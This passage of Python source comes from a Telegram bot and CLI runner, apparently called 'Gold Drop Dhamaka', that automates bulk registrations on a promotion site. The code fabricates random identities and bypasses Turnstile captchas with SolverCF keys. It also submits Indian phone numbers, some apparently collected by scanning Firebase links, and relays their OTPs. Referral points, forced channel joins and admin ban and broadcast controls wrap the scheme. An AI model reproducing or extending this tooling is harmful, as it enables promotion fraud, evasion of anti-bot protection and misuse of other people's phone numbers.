                f"👉 <i>Neeche keyboard se <b>'▶️ Start Scan'</b> dabayein!</i>",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        digits_only = "".join(filter(str.isdigit, text))
        if uid in _manual_sessions and 4 <= len(digits_only) <= 6 and text == digits_only:
            verify_manual_otp_flow(message, digits_only)
            return

        clean_p = digits_only
        if len(clean_p) == 12 and clean_p.startswith("91"):
            clean_p = clean_p[2:]
        if len(clean_p) == 10 and clean_p[0] in "6789":
            if get_active_image_payload(uid=uid):
                start_manual_number_flow(message, clean_p)
            else:
                bot.reply_to(
                    message,
                    f"📱 <b>Mobile Number Detect Hua:</b> <code>+91{clean_p}</code>\n\n"
                    f"Pehle photo upload karein, ya Firebase links add karke scan chalayein.",
                    reply_markup=build_reply_keyboard(uid)
                )
            return

        bot.reply_to(
            message,
            "❓ <b>Command samajh nahi aayi.</b>\n\n"
            "• Firebase link paste karein (single ya multiple)\n"
            "• .txt file send karein\n"
            "• Ya neeche keyboard buttons use karein:\n\n"
            "",
            reply_markup=build_reply_keyboard(uid)
        )

    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback_queries(call):
        uid = str(call.from_user.id)
        data = call.data
        chat_id = call.message.chat.id
        msg_id = call.message.message_id

        if data == "verify_join":
            register_bot_user(uid, call.from_user.username or "", call.from_user.first_name or "")
            missing = get_missing_channels(uid)
            if missing:
                bot.answer_callback_query(call.id, "⚠️ Abhi sabhi channels join nahi hue hain!", show_alert=True)
                send_join_prompt(chat_id, missing, edit_msg_id=msg_id)
                return
            bot.answer_callback_query(call.id, "✅ Membership Verified!", show_alert=False)
            try:
                bot.delete_message(chat_id, msg_id)
            except Exception:
                pass
            send_welcome_screen(chat_id, uid)
            return

        if not check_access(call):
            bot.answer_callback_query(call.id, "⛔ Access Blocked / Join Channels First", show_alert=True)
            return

        if data == "main_menu":
            bot.answer_callback_query(call.id)
            try:
                bot.delete_message(chat_id, msg_id)
            except Exception:
                pass
            send_welcome_screen(chat_id, uid)

        elif data == "view_refer":
            bot.answer_callback_query(call.id)
            try:
                bot.edit_message_text(render_refer_text(uid), chat_id=chat_id, message_id=msg_id, reply_markup=build_refer_keyboard(uid))
            except Exception:
                bot.send_message(chat_id, render_refer_text(uid), reply_markup=build_refer_keyboard(uid))

        elif data == "view_leaderboard":
            bot.answer_callback_query(call.id)
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("🎁 My Refer Link", callback_data="view_refer"),
                types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")
            )
            try:
                bot.edit_message_text(render_leaderboard_text(), chat_id=chat_id, message_id=msg_id, reply_markup=markup)
            except Exception:
                bot.send_message(chat_id, render_leaderboard_text(), reply_markup=markup)

        elif data == "admin_panel":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            try:
                bot.edit_message_text(render_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_admin_menu())
            except Exception:
                bot.send_message(chat_id, render_admin_text(), reply_markup=build_admin_menu())

        elif data == "admin_channels":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            try:
                bot.edit_message_text(render_channels_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_channels_admin_keyboard())
            except Exception:
                bot.send_message(chat_id, render_channels_admin_text(), reply_markup=build_channels_admin_keyboard())

        elif data == "admin_prompt_add_ch":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_add_channel"
            bot.edit_message_text(
                "➕ <b>Mandatory Channel Add Karein:</b>\n\n"
                "Format 1: <code>@Harshitxloot</code>\n"
                "Format 2: <code>@Harshitxloot | Harshit x Loot | https://t.me/Harshitxloot</code>\n"
                "Format 3: <code>-1001234567890 | VIP Channel | https://t.me/+AbCdEfGh</code>\n\n"
                "",
                chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid)
            )

        elif data.startswith("admin_del_ch|"):
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            ch_id = data.split("|", 1)[1]
            remove_required_channel(ch_id)
            bot.answer_callback_query(call.id, f"✅ Removed {ch_id}", show_alert=True)
            bot.edit_message_text(render_channels_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_channels_admin_keyboard())

        elif data == "admin_clear_ch":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            clear_required_channels()
            bot.answer_callback_query(call.id, "🗑️ All channels cleared!", show_alert=True)
            bot.edit_message_text(render_channels_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_channels_admin_keyboard())

        elif data == "admin_toggle_force_join":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            new_val = "0" if is_force_join_enabled() else "1"
            set_setting("force_join", new_val)
            bot.answer_callback_query(call.id, f"Force Join: {'ON' if new_val == '1' else 'OFF'}", show_alert=True)
            bot.edit_message_text(render_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_admin_menu())

        elif data == "admin_toggle_refer":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            new_val = "0" if is_refer_enabled() else "1"
            set_setting("refer_enabled", new_val)
            bot.answer_callback_query(call.id, f"Refer System: {'ON' if new_val == '1' else 'OFF'}", show_alert=True)
            bot.edit_message_text(render_admin_text(), chat_id=chat_id, message_id=msg_id, reply_markup=build_admin_menu())

        elif data == "admin_prompt_add_credit":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_add_credit"
            bot.edit_message_text(
                "💳 <b>User Ko Credit Add Karein:</b>\n\nFormat: <code>&lt;user_id&gt; &lt;points&gt;</code>\nExample: <code>8083076438 50</code>",
                chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid)
            )

        elif data == "admin_prompt_deduct_credit":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_deduct_credit"
            bot.edit_message_text(
                "💸 <b>User Se Credit Deduct Karein:</b>\n\nFormat: <code>&lt;user_id&gt; &lt;points&gt;</code>\nExample: <code>8083076438 20</code>",
                chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid)
            )

        elif data == "admin_prompt_refer_bonus":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_set_refer_bonus"
            bot.edit_message_text(f"💰 <b>Per Refer Bonus Points Set Karein:</b>\nCurrent: <b>{get_refer_bonus()} pts</b>", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data.startswith("admin_users_"):
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            page = int(data.split("_")[-1])
            users = get_all_bot_users()
            per_p = 8
            s_i = page * per_p
            e_i = min(s_i + per_p, len(users))
            lines = [f"👥 <b>BOT USERS ({len(users)} total)</b>\n─────────────────────────"]
            for r_u in users[s_i:e_i]:
                u_id, u_name, u_first, u_ban, u_scans, u_refs, u_pts, _ = r_u
                badge = "🚫 Banned" if u_ban else ("👑 Admin" if str(u_id) in {str(x) for x in ADMIN_IDS} else "✅ Active")
                handle_txt = f"@{u_name}" if u_name else (u_first or "User")
                lines.append(f"• <code>{u_id}</code> ({handle_txt}) — {badge} | Refs: <b>{u_refs or 0}</b> | Pts: <b>{u_pts or 0}</b>")
            lines.append("")
            markup = types.InlineKeyboardMarkup()
            nav = []
            if page > 0:
                nav.append(types.InlineKeyboardButton("◀️ Prev", callback_data=f"admin_users_{page-1}"))
            if e_i < len(users):
                nav.append(types.InlineKeyboardButton("Next ▶️", callback_data=f"admin_users_{page+1}"))
            if nav:
                markup.row(*nav)
            markup.row(types.InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel"))
            try:
                bot.edit_message_text("\n".join(lines), chat_id=chat_id, message_id=msg_id, reply_markup=markup)
            except Exception:
                bot.send_message(chat_id, "\n".join(lines), reply_markup=markup)

        elif data == "admin_prompt_broadcast":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_broadcast"
            bot.edit_message_text("📢 <b>Broadcast Message Bhejein:</b>\n\nJo message aap sabhi bot users ko bhejna chahte hain woh likhein:", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_prompt_ban":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_ban_user"
            bot.edit_message_text("🚫 <b>Ban User ID Bhejein:</b>\n\nJis user ka access band karna hai uski numeric Telegram User ID likhein:", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_prompt_unban":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_unban_user"
            bot.edit_message_text("✅ <b>Unban User ID Bhejein:</b>\n\nJis user ko unban karna hai uski numeric Telegram User ID likhein:", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_prompt_batch":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_set_batch"
            bot.edit_message_text(f"🏷 <b>Naya Batch Code Bhejein:</b>\nCurrent: <code>{BATCH_CODE}</code>", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_prompt_pincode":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_set_pincode"
            bot.edit_message_text(f"📍 <b>Naya 6-Digit Pincode Bhejein:</b>\nCurrent: <code>{PINCODE}</code>", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_prompt_timeout":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            user_states[uid] = "admin_set_timeout"
            bot.edit_message_text(f"⏱ <b>Naya OTP Timeout (seconds) Bhejein:</b>\nCurrent: <code>{OTP_TIMEOUT}s</code>", chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))

        elif data == "admin_force_stop":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            for k_uid, s_ev in list(_stop_events.items()):
                s_ev.set()
            bot.answer_callback_query(call.id, "🛑 Force stop sent!", show_alert=True)
            bot.edit_message_text("🛑 <b>Sabhi active scans ko stop signal bhej diya gaya hai.</b>", chat_id=chat_id, message_id=msg_id, reply_markup=build_admin_menu())

        elif data == "admin_confirm_reset_db":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            bot.answer_callback_query(call.id)
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("⚠️ Yes, Reset Processed DB", callback_data="admin_do_reset_db"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")
            )
            bot.edit_message_text("🧹 <b>Kya aap sach me processed numbers ki DB history reset karna chahte hain?</b>", chat_id=chat_id, message_id=msg_id, reply_markup=markup)

        elif data == "admin_do_reset_db":
            if not is_admin(uid):
                bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
                return
            reset_processed_db()
            bot.answer_callback_query(call.id, "🧹 Processed DB reset!", show_alert=True)
            bot.edit_message_text("✅ <b>Processed numbers database reset ho gaya hai.</b>", chat_id=chat_id, message_id=msg_id, reply_markup=build_admin_menu())

        elif data.startswith("manage_keys_"):
            bot.answer_callback_query(call.id)
            page = int(data.split("_")[-1])
            all_k = load_captcha_keys(uid=uid)
            total_k = len(all_k)
            if not all_k:
                text = (
                    "🔑 <b>SolverCF Keys Manager</b>\n\n"
                    "⚠️ <i>Filhal koi API key saved nahi hai.</i>\n\n"
                    "🌐 <b>SolverCF Link:</b> https://solvercf.com/dashboard\n"
                    "💡 <i>Example:</i> <code>SCF_live_1234567890abcdef</code>"
                )
            else:
                lines = [f"#{i+1}: <code>{k[:6]}...{k[-4:]}</code>" for i, k in enumerate(all_k[page*5:(page+1)*5], start=page*5)]
                text = f"🔑 <b>SolverCF Keys Manager ({total_k} total)</b>\n\n" + "\n".join(lines) + ""
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=build_captcha_keys_keyboard(page, uid=uid))
            except Exception:
                bot.send_message(chat_id, text, reply_markup=build_captcha_keys_keyboard(page, uid=uid))

        elif data == "prompt_add_keys":
            bot.answer_callback_query(call.id)
            user_states[uid] = "waiting_for_keys"
            prompt_text = (
                "🔑 <b>SolverCF API Key(s) Add Karein:</b>\n\n"
                "Apni SolverCF API Key yahan chat me paste karke send karein.\n\n"
                "🌐 <b>SolverCF Website:</b> https://solvercf.com/dashboard\n"
                "💡 <i>Example:</i> <code>SCF_live_1234567890abcdef</code>"
            )
            try:
                bot.edit_message_text(prompt_text, chat_id=chat_id, message_id=msg_id, reply_markup=build_back_button(uid))
            except Exception:
                bot.send_message(chat_id, prompt_text, reply_markup=build_back_button(uid))

        elif data == "check_keys_balance":
            bot.answer_callback_query(call.id, "Checking balances...", show_alert=False)
            all_k = load_captcha_keys(uid=uid)
            if not all_k:
                bot.answer_callback_query(call.id, "Koi keys saved nahi hain!", show_alert=True)
                return

            status_lines = []
            for i, k in enumerate(all_k):
                bal, err = get_solvercf_balance(k)
                masked = f"{k[:6]}...{k[-4:]}"
                if bal is not None:
                    badge = "✅" if bal > 0 else "⚠️ (0 Balance)"
                    status_lines.append(f"#{i+1} <code>{masked}</code>: <b>${bal:.2f}</b> {badge}")
                else:
                    status_lines.append(f"#{i+1} <code>{masked}</code>: ❌ {err}")

            res_text = "💰 <b>SolverCF Keys Live Balance:</b>\n\n" + "\n".join(status_lines) + ""
            try:
                bot.edit_message_text(res_text, chat_id=chat_id, message_id=msg_id, reply_markup=build_captcha_keys_keyboard(0, uid=uid))
            except Exception:
                bot.send_message(chat_id, res_text, reply_markup=build_captcha_keys_keyboard(0, uid=uid))

        elif data.startswith("del_key_"):
            parts = data.split("_")
            idx = int(parts[2])
            page = int(parts[3]) if len(parts) > 3 else 0
            all_k = load_captcha_keys(uid=uid)
            if 0 <= idx < len(all_k):
                delete_captcha_key(all_k[idx], uid=uid)
                bot.answer_callback_query(call.id, f"Key #{idx+1} deleted!", show_alert=True)
            else:
                bot.answer_callback_query(call.id)
            all_k = load_captcha_keys(uid=uid)
            if not all_k:
                text = "🔑 <b>SolverCF Keys Manager</b>\n\n⚠️ <i>Ab koi API key saved nahi hai.</i>"
            else:
                lines = [f"#{i+1}: <code>{k[:6]}...{k[-4:]}</code>" for i, k in enumerate(all_k[page*5:(page+1)*5], start=page*5)]
                text = f"🔑 <b>SolverCF Keys Manager ({len(all_k)} total)</b>\n\n" + "\n".join(lines) + ""
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=build_captcha_keys_keyboard(page, uid=uid))
            except Exception:
                bot.send_message(chat_id, text, reply_markup=build_captcha_keys_keyboard(page, uid=uid))

        elif data == "confirm_clear_all_keys":
            bot.answer_callback_query(call.id)
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("⚠️ Yes, Clear All Keys", callback_data="do_clear_all_keys"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="manage_keys_0")
            )
            bot.edit_message_text("❓ <b>Kya aap sach me saari SolverCF API keys delete karna chahte hain?</b>",
                                  chat_id=chat_id, message_id=msg_id, reply_markup=markup)

        elif data == "do_clear_all_keys":
            clear_all_captcha_keys(uid=uid)
            bot.answer_callback_query(call.id, "All keys deleted!", show_alert=True)
            bot.edit_message_text("🔑 <b>SolverCF Keys Manager</b>\n\n⚠️ <i>Saari API keys delete ho chuki hain.</i>",
                                  chat_id=chat_id, message_id=msg_id, reply_markup=build_captcha_keys_keyboard(0, uid=uid))

        elif data.startswith("manage_fb_"):
            bot.answer_callback_query(call.id)
            page = int(data.split("_")[2])
            all_p = get_all_panels(uid)
            total_p = len(all_p)

            if total_p == 0:
                bot.edit_message_text(
                    "📋 <b>Your Firebases:</b>\n\nAbhi koi Firebase panels saved nahi hain.",
                    chat_id=chat_id, message_id=msg_id
                )
                return

            per_page = 5
            start_idx = page * per_page
            end_idx = min(start_idx + per_page, total_p)
            current_slice = all_p[start_idx:end_idx]

            lines = [f"⚙️ <b>YOUR FIREBASES</b> (Total: {total_p})\n─────────────────────────"]
            for i, p in enumerate(current_slice, start=start_idx + 1):
                status_icon = "✅ Done" if p.get("processed") else "⏳ Pending"
                lines.append(f"<b>#{i}</b> [{status_icon}]\n<code>{p['url']}</code>")
            lines.append("─────────────────────────")

            bot.edit_message_text(
                "\n".join(lines),
                chat_id=chat_id, message_id=msg_id,
                reply_markup=build_manage_keyboard(uid, page, per_page)
            )

        elif data.startswith("del_fb_"):
            parts = data.split("_")
            pid = int(parts[2])
            page = int(parts[3])
            deleted = delete_single_panel(uid, pid)
            bot.answer_callback_query(call.id, "✅ Panel deleted!" if deleted else "⚠️ Panel not found", show_alert=False)
            all_p = get_all_panels(uid)
            if page * 5 >= len(all_p) and page > 0:
                page -= 1
            call.data = f"manage_fb_{page}"
            handle_callback_queries(call)

        elif data == "confirm_clear_all_fb":
            bot.answer_callback_query(call.id)
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("⚠️ Yes, Clear All", callback_data="do_clear_all_fb"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="manage_fb_0")
            )
            bot.edit_message_text(
                "⚠️ <b>Confirmation:</b>\n\nKya aap sach me apne <b>saare Firebase panels</b> delete karna chahte hain?",
                chat_id=chat_id, message_id=msg_id, reply_markup=markup
            )

        elif data == "do_clear_all_fb":
            clear_all_panels(uid)
            bot.answer_callback_query(call.id, "🗑️ All Firebase panels cleared!", show_alert=True)
            bot.edit_message_text(
                "✅ <b>Aapke saare Firebase panels clear kar diye gaye!</b>",
                chat_id=chat_id, message_id=msg_id
            )

        elif data in ("view_live_status", "refresh_live_status"):
            bot.answer_callback_query(call.id, "🔄 Status refreshed!", show_alert=False)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_live_status"))
            try:
                bot.edit_message_text(
                    render_live_status_text(uid),
                    chat_id=chat_id, message_id=msg_id,
                    reply_markup=markup
                )
            except Exception:
                pass

        elif data == "cancel_manual":
            bot.answer_callback_query(call.id, "Cancelled!")
            cancel_manual_flow(chat_id, uid, edit_msg_id=msg_id)
            return

        elif data == "noop":
            bot.answer_callback_query(call.id)

    print("=" * 60)
    print("🤖 Gold Drop Telegram Bot Initialized Successfully!")
    print("   Devloper by - @Harshitop_19")
    print(f"   Batch Code  : {BATCH_CODE}")
    print(f"   Pincode     : {PINCODE}")
    print(f"   DB Path     : {DB_PATH}")
    print("   Starting polling...")
    print("=" * 60)
    bot.infinity_polling(skip_pending=True)

def run_cli(phone_arg=""):
    init_db()
    img_payload = get_active_image_payload()
    if not img_payload:
        print("=" * 60)
        print("⚠️ KOI IMAGE YA BASE64 CODE NAHI MILA!")
        print("Kripya image_base64.txt me apna base64 code rakhein ya photo.jpg rakhein.")
        print("=" * 60)
        sys.exit(1)

    phone = (phone_arg or input("10-digit Indian Mobile: ")).strip()
    if len(phone) == 12 and phone.startswith("91"):
        phone = phone[2:]
    if not phone.isdigit() or len(phone) != 10 or phone[0] not in "6789":
        sys.exit("❌ Invalid Indian mobile — expected 10 digits starting 6/7/8/9")

    name, email = generate_random_identity()
    print(f"\n📱 Phone: +91 {phone} | Name: {name} | Email: {email}")

    master_key = str(random.randint(1000000000, 9999999999))
    s = make_session(master_key)
    _, uk, dk = step_init(s, master_key, PINCODE)
    if not uk or not dk:
        sys.exit("❌ Session init failed.")

    step_get_start(s, uk)
    print("🔐 Solving Turnstile Captcha via SolverCF...")
    c_token, used_key, c_err = solve_turnstile_solvercf(uid=u_key)
    if c_err or not c_token:
        print(f"⚠️ Captcha warning: {c_err}")
    r = step_register(s, uk, dk, name, phone, email, PINCODE, img_payload, captcha_token=c_token or "")
    if r is None or r.status_code not in (200, 201):
        sys.exit("❌ Registration failed.")

    print(f"✅ OTP sent to +91 {phone[:5]}•••{phone[-2:]}")
    otp = input("Enter 6-digit OTP: ").strip()

    r4 = step_verify_otp(s, uk, dk, otp)
    try:
        decoded = base64.b64decode(r4.json()["resp"]).decode()
        result = json.loads(decoded)
        print("\n" + "=" * 50)
        print("Verification Result:")
        print(json.dumps(result, indent=2))
        print("=" * 50)
    except Exception as e:
        print(f"Response: {r4.text}")

def main():
    global BATCH_CODE, PINCODE, OTP_TIMEOUT
    init_db()
    BATCH_CODE = get_setting("batch_code", BATCH_CODE)
    PINCODE = get_setting("pincode", PINCODE)
    try:
        OTP_TIMEOUT = int(get_setting("otp_timeout", OTP_TIMEOUT))
    except Exception:
        pass
    parser = argparse.ArgumentParser(description="Gold Drop Dhamaka — Unified All-in-One Runner")
    parser.add_argument("phone", nargs="?", default="", help="10-digit Indian mobile (starts CLI mode)")
    parser.add_argument("--bot", action="store_true", help="Force start Telegram Bot mode")
    parser.add_argument("--cli", action="store_true", help="Force start Terminal / CLI mode")
    args = parser.parse_args()

    if args.cli or args.phone:
        run_cli(args.phone)
        return

    if args.bot or (BOT_TOKEN and BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE"):
        start_telegram_bot()
    else:
        run_cli()

if __name__ == "__main__":
    main()
